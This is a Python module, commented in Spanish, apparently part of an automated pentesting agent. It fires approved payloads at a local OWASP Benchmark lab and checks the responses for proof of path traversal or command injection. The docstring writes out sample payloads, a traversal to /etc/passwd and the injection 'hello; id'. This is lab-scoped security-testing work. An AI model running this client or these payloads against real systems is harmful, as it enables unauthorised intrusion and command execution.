"""
FASE 6 — Agente de Ataque Real (attack_node).
FASE 9b — Segundo caso de prueba: Command Injection (cmdi-00/BenchmarkTest00006).

Ejecuta el payload aprobado (por EJECUCION_AUTOMATICA directa o por HITL)
contra un laboratorio autorizado real: OWASP Benchmark, corriendo en local
vía Docker (contenedor `owasp-benchmark`, https://127.0.0.1:8443).

Dos casos de prueba reales y documentados del propio suite OWASP Benchmark,
cada uno con su propio mecanismo de inyección y marcadores de evidencia
verificados manualmente antes de automatizarlos (nunca se asume éxito solo
por HTTP 200):

  - path_traversal (pathtraver-00 / BenchmarkTest00001): el valor de la
    cookie `BenchmarkTest00001` se concatena sin sanitizar a una ruta base
    y se abre con `FileInputStream`.
        - Valor inocuo ("test123")                -> "No such file or directory"
        - Traversal real ("../../.../etc/passwd") -> "Problem getting FileInputStream"
          (el fichero SÍ se localizó; falla después al leerlo como imagen)

  - command_injection (cmdi-00 / BenchmarkTest00006): el valor del HEADER
    HTTP `BenchmarkTest00006` (no cookie ni body) se decodifica con
    `URLDecoder` y se concatena sin sanitizar a `sh -c "echo " + param`.
        - Valor inocuo ("hello")       -> se hace eco literal, sin más salida
        - Inyección real ("hello; id") -> el `; ` rompe el `echo` y ejecuta
          `id` como comando separado -> "uid=0(root) gid=0(root) ..." en la
          salida (el contenedor corre como root), HTML-escapado por el
          servlet como "uid&#x3d;0&#x28;root&#x29;".
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Literal
from urllib.parse import quote, urlparse

import aiohttp

VulnerabilityClass = Literal["path_traversal", "command_injection"]

BENCHMARK_BASE_URL = "https://127.0.0.1:8443"

BENCHMARK_TRAVERSAL_TEST_PATH = "/benchmark/pathtraver-00/BenchmarkTest00001"
BENCHMARK_TRAVERSAL_COOKIE_NAME = "BenchmarkTest00001"

BENCHMARK_CMDI_TEST_PATH = "/benchmark/cmdi-00/BenchmarkTest00006"
BENCHMARK_CMDI_HEADER_NAME = "BenchmarkTest00006"

# Fragmento de respuesta cuando el path solicitado NO existe (payload
# sanitizado o inocuo) — confirmado empíricamente contra el lab real.
_TRAVERSAL_NOT_FOUND_MARKER = "No such file or directory"
# Fragmento de respuesta cuando el FileInputStream SÍ localizó el archivo
# (la traversal funcionó) pero el endpoint falla al leerlo como imagen.
_TRAVERSAL_FOUND_MARKER = "Problem getting FileInputStream"

# Firma de salida de `id` ejecutado por el shell tras una inyección exitosa
# (el proceso Java del contenedor corre como root) — cubre tanto el texto
# crudo como la variante HTML-escapada que produce el servlet de respuesta.
_CMDI_SUCCESS_MARKERS = ("uid=", "uid&#x3d;")


@dataclass
class AttackResult:
    target_url: str
    payload: str
    http_status: int
    response_snippet: str
    exploited: bool  # True si la evidencia de la respuesta confirma traversal real
    rationale: str


class RealAttackClient:
    """Cliente HTTP mínimo contra el laboratorio OWASP Benchmark autorizado."""

    def __init__(self, base_url: str = BENCHMARK_BASE_URL, timeout_seconds: float = 10.0) -> None:
        self._base_url = base_url
        self._timeout = aiohttp.ClientTimeout(total=timeout_seconds)

    async def execute(
        self,
        payload: str,
        vulnerability_class: VulnerabilityClass = "path_traversal",
        test_path: str | None = None,
    ) -> AttackResult:
        """
        `test_path` (FASE 9c): ruta o URL absoluta de un caso de prueba
        específico, tal como la produce `agents/recon_scanner.py` durante el
        escaneo completo -- distinto del único endpoint fijo original. Si se
        omite, se usa el endpoint canónico fijado por `vulnerability_class`
        (comportamiento previo, sin cambios).

        El nombre del header/cookie de inyección se deriva del último
        segmento de la ruta (`BenchmarkTestXXXXX`), por convención verificada
        manualmente en el código fuente de OWASP Benchmark: coincide con el
        nombre del endpoint en todos los casos de prueba inspeccionados.
        """
        if vulnerability_class == "command_injection":
            return await self._execute_command_injection(payload, test_path)
        return await self._execute_path_traversal(payload, test_path)

    def _resolve_url_and_field_name(self, test_path: str | None, default_path: str, default_field: str) -> tuple[str, str]:
        if test_path is None:
            return f"{self._base_url}{default_path}", default_field
        url = test_path if test_path.startswith("http") else f"{self._base_url}{test_path}"
        field_name = urlparse(url).path.rsplit("/", 1)[-1] or default_field
        return url, field_name

    async def _execute_path_traversal(self, payload: str, test_path: str | None = None) -> AttackResult:
        url, cookie_name = self._resolve_url_and_field_name(
            test_path, BENCHMARK_TRAVERSAL_TEST_PATH, BENCHMARK_TRAVERSAL_COOKIE_NAME
        )
        cookies = {cookie_name: payload}

        # verify_ssl=False: el laboratorio usa un certificado autofirmado local;
        # esto NUNCA debe hacerse contra un objetivo real fuera del lab.
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=self._timeout, connector=connector) as session:
            async with session.post(
                url,
                cookies=cookies,
                data={cookie_name: "safe"},
            ) as response:
                status = response.status
                body = await response.text()

        snippet = body.strip()[:300]

        if _TRAVERSAL_NOT_FOUND_MARKER in body:
            exploited = False
            rationale = "El servidor no localizó el archivo objetivo: payload sanitizado o ruta inválida."
        elif _TRAVERSAL_FOUND_MARKER in body:
            exploited = True
            rationale = (
                "El servidor localizó y abrió el archivo fuera del directorio base "
                "(FileInputStream no lanzó 'No such file or directory') -> path traversal confirmado."
            )
        else:
            exploited = False
            rationale = "Respuesta no reconocida por los marcadores de evidencia conocidos; no se asume éxito."

        return AttackResult(
            target_url=url,
            payload=payload,
            http_status=status,
            response_snippet=snippet,
            exploited=exploited,
            rationale=rationale,
        )

    async def _execute_command_injection(self, payload: str, test_path: str | None = None) -> AttackResult:
        url, header_name = self._resolve_url_and_field_name(
            test_path, BENCHMARK_CMDI_TEST_PATH, BENCHMARK_CMDI_HEADER_NAME
        )
        # El servlet lee el valor del HEADER (no cookie ni body) y lo
        # URL-decodifica él mismo -> hay que percent-encodearlo aquí antes de
        # enviarlo (un header HTTP crudo no puede llevar CR/LF/control chars
        # -- payloads generados por el Fuzzer pueden incluirlos, ej. un `\n`
        # dentro de un `echo`, y aiohttp los rechaza correctamente como
        # posible header injection). El servidor decodifica exactamente el
        # mismo valor que se habría enviado crudo.
        headers = {header_name: quote(payload, safe="")}

        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=self._timeout, connector=connector) as session:
            async with session.post(url, headers=headers) as response:
                status = response.status
                body = await response.text()

        snippet = body.strip()[:300]

        if any(marker in body for marker in _CMDI_SUCCESS_MARKERS):
            exploited = True
            rationale = (
                "La salida del comando incluye la firma de `id` ejecutado por el shell "
                "(uid=/gid=/groups=) -> command injection confirmado; el metacaracter de "
                "separación rompió el `echo` y ejecutó un comando adicional."
            )
        else:
            exploited = False
            rationale = (
                "La respuesta solo contiene el eco literal del valor enviado: el shell no "
                "interpretó ningún metacaracter de separación de comandos."
            )

        return AttackResult(
            target_url=url,
            payload=payload,
            http_status=status,
            response_snippet=snippet,
            exploited=exploited,
            rationale=rationale,
        )
